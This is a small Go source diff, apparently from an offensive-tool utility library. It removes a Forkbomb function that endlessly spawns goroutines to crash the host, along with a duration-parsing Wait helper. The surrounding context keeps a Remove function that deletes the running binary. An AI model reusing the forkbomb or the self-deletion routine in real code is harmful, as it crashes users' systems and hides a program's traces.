@@ -142,33 +142,6 @@ func ExitOnError(e error) {
 	}
 }
 
-// Wait uses a human friendly string that indicates how long a system should wait.
-func Wait(interval string) {
-	period_letter := string(interval[len(interval)-1])
-	intr := string(interval[:len(interval)-1])
-	i, _ := strconv.ParseInt(intr, 10, 64)
-
-	var x int64
-
-	switch period_letter {
-	case "s":
-		x = i
-	case "m":
-		x = i * 60
-	case "h":
-		x = i * 3600
-	}
-
-	time.Sleep(time.Duration(x) * time.Second)
-}
-
-// Forkbomb spawns goroutines in order to crash the machine.
-func Forkbomb() {
-	for {
-		go Forkbomb()
-	}
-}
-
 // Remove is used to self delete.
 func Remove() {
 	os.Remove(os.Args[0])
